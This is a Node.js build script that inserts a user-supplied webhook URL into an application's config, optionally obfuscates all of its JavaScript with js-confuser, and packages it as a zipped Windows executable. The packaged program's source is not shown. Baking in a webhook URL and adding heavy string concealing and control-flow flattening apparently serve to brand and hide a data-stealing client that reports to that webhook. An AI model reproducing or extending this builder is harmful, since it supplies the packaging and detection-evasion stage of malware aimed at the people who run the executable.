/**
 * Modular Build System
 * Handles building and packaging of the application
 */

const fs = require('fs');
const path = require('path');
const archiver = require('archiver');
const { exec } = require('child_process');
const { promisify } = require('util');

const execAsync = promisify(exec);

class Builder {
    constructor() {
        this.projectRoot = path.join(__dirname, '..');
        this.buildDir = path.join(this.projectRoot, 'dist');
        this.srcDir = path.join(this.projectRoot, 'src');
        this.tempDir = path.join(this.projectRoot, 'temp');
    }

    /**
     * Initialize build environment
     */
    init() {
        console.log('Initializing build environment...');
        
        // Create build directories
        this.ensureDir(this.buildDir);
        this.ensureDir(this.tempDir);
        
        console.log('Build environment initialized');
    }

    /**
     * Ensure directory exists
     * @param {string} dir - Directory path
     */
    ensureDir(dir) {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
    }

    /**
     * Clean build directory
     */
    clean() {
        console.log('Cleaning build directory...');
        
        if (fs.existsSync(this.buildDir)) {
            fs.rmSync(this.buildDir, { recursive: true, force: true });
        }
        
        if (fs.existsSync(this.tempDir)) {
            fs.rmSync(this.tempDir, { recursive: true, force: true });
        }
        
        console.log('Build directory cleaned');
    }

    /**
     * Configure application for build
     * @param {Object} config - Build configuration
     */
    configure(config) {
        console.log('Configuring application...');
        
        const { webhookUrl, appName, obfuscate } = config;
        
        // Create temporary source directory
        const tempSrcDir = path.join(this.tempDir, 'src');
        this.copyDirectory(this.srcDir, tempSrcDir);
        
        // Update configuration
        this.updateConfiguration(tempSrcDir, {
            webhookUrl,
            appName
        });
        
        // Obfuscate if requested
        if (obfuscate) {
            this.obfuscateCode(tempSrcDir);
        }
        
        console.log('Application configured');
        return tempSrcDir;
    }

    /**
     * Update application configuration
     * @param {string} srcDir - Source directory
     * @param {Object} config - Configuration updates
     */
    updateConfiguration(srcDir, config) {
        const configFile = path.join(srcDir, 'config', 'config.js');
        
        if (fs.existsSync(configFile)) {
            let content = fs.readFileSync(configFile, 'utf8');
            
            if (config.webhookUrl) {
                content = content.replace('%WEBHOOK%', config.webhookUrl);
            }
            
            if (config.appName) {
                content = content.replace(
                    "name: process.env.APP_NAME || 'client'",
                    `name: process.env.APP_NAME || '${config.appName}'`
                );
            }
            
            fs.writeFileSync(configFile, content);
        }
    }

    /**
     * Obfuscate JavaScript code
     * @param {string} srcDir - Source directory
     */
    obfuscateCode(srcDir) {
        console.log('Obfuscating code...');
        
        try {
            const JsConfuser = require('js-confuser');
            
            const obfuscateOptions = {
                target: 'node',
                preset: 'medium',
                renameVariables: true,
                renameGlobals: false,
                controlFlowFlattening: 0.5,
                deadCode: 0.3,
                dispatcher: 0.3,
                stringEncoding: true,
                stringCompression: true,
                stringConcealing: true
            };
            
            this.obfuscateDirectory(srcDir, obfuscateOptions);
            console.log('Code obfuscation completed');
        } catch (error) {
            console.warn('Code obfuscation failed:', error.message);
        }
    }

    /**
     * Recursively obfuscate directory
     * @param {string} dir - Directory to obfuscate
     * @param {Object} options - Obfuscation options
     */
    obfuscateDirectory(dir, options) {
        const files = fs.readdirSync(dir);
        
        for (const file of files) {
            const filePath = path.join(dir, file);
            const stat = fs.statSync(filePath);
            
            if (stat.isDirectory()) {
                this.obfuscateDirectory(filePath, options);
            } else if (file.endsWith('.js')) {
                try {
                    const content = fs.readFileSync(filePath, 'utf8');
                    const obfuscated = require('js-confuser').obfuscate(content, options);
                    fs.writeFileSync(filePath, obfuscated);
                } catch (error) {
                    console.warn(`Failed to obfuscate ${filePath}:`, error.message);
                }
            }
        }
    }

    /**
     * Build executable using pkg
     * @param {string} srcDir - Source directory
     * @param {Object} options - Build options
     */
    async buildExecutable(srcDir, options) {
        console.log('Building executable...');
        
        const { outputName, target, compress } = options;
        const mainFile = path.join(srcDir, 'main.js');
        const outputPath = path.join(this.buildDir, `${outputName}.exe`);
        
        // Create temporary package.json
        const packageJson = {
            name: outputName,
            version: '3.0.0',
            main: 'main.js',
            bin: 'main.js',
            pkg: {
                targets: [target || 'node16-win-x64'],
                outputPath: this.buildDir
            }
        };
        
        const packagePath = path.join(srcDir, 'package.json');
        fs.writeFileSync(packagePath, JSON.stringify(packageJson, null, 2));
        
        // Build with pkg
        const pkgCommand = `pkg ${compress ? '-C GZip' : ''} -o "${outputPath}" -t "${target || 'node16-win-x64'}" "${srcDir}"`;
        
        try {
            await execAsync(pkgCommand);
            console.log(`Executable built: ${outputPath}`);
            return outputPath;
        } catch (error) {
            throw new Error(`Build failed: ${error.message}`);
        }
    }

    /**
     * Create archive
     * @param {string} filePath - File to archive
     * @param {string} outputName - Output archive name
     */
    async createArchive(filePath, outputName) {
        console.log('Creating archive...');
        
        const archivePath = path.join(this.buildDir, `${outputName}.zip`);
        
        return new Promise((resolve, reject) => {
            const output = fs.createWriteStream(archivePath);
            const archive = archiver('zip', { zlib: { level: 9 } });
            
            output.on('close', () => {
                console.log(`Archive created: ${archivePath} (${archive.pointer()} bytes)`);
                resolve(archivePath);
            });
            
            archive.on('error', reject);
            
            archive.pipe(output);
            archive.file(filePath, { name: path.basename(filePath) });
            archive.finalize();
        });
    }

    /**
     * Copy directory recursively
     * @param {string} src - Source directory
     * @param {string} dest - Destination directory
     */
    copyDirectory(src, dest) {
        this.ensureDir(dest);
        
        const files = fs.readdirSync(src);
        
        for (const file of files) {
            const srcPath = path.join(src, file);
            const destPath = path.join(dest, file);
            const stat = fs.statSync(srcPath);
            
            if (stat.isDirectory()) {
                this.copyDirectory(srcPath, destPath);
            } else {
                fs.copyFileSync(srcPath, destPath);
            }
        }
    }

    /**
     * Build application with configuration
     * @param {Object} config - Build configuration
     */
    async build(config) {
        try {
            console.log('Starting build process...');
            
            // Initialize and clean
            this.init();
            this.clean();
            this.init();
            
            // Configure application
            const tempSrcDir = this.configure(config);
            
            // Build executable
            const executablePath = await this.buildExecutable(tempSrcDir, config);
            
            // Create archive if requested
            let archivePath = null;
            if (config.createArchive) {
                archivePath = await this.createArchive(executablePath, config.appName);
            }
            
            // Clean temporary files
            if (fs.existsSync(this.tempDir)) {
                fs.rmSync(this.tempDir, { recursive: true, force: true });
            }
            
            console.log('Build completed successfully');
            
            return {
                executable: executablePath,
                archive: archivePath
            };
        } catch (error) {
            console.error('Build failed:', error.message);
            throw error;
        }
    }
}

// CLI interface
if (require.main === module) {
    const args = process.argv.slice(2);
    
    if (args.length < 2) {
        console.log('Usage: node builder.js <webhook_url> <app_name> [options]');
        console.log('Options:');
        console.log('  --obfuscate    Obfuscate code');
        console.log('  --compress     Compress executable');
        console.log('  --target       Target platform (default: node16-win-x64)');
        process.exit(1);
    }
    
    const [webhookUrl, appName] = args;
    const options = {
        webhookUrl,
        appName,
        outputName: appName,
        obfuscate: args.includes('--obfuscate'),
        compress: args.includes('--compress'),
        target: args.includes('--target') ? args[args.indexOf('--target') + 1] : 'node16-win-x64',
        createArchive: true
    };
    
    const builder = new Builder();
    builder.build(options)
        .then(result => {
            console.log('Build results:', result);
        })
        .catch(error => {
            console.error('Build failed:', error.message);
            process.exit(1);
        });
}

module.exports = Builder;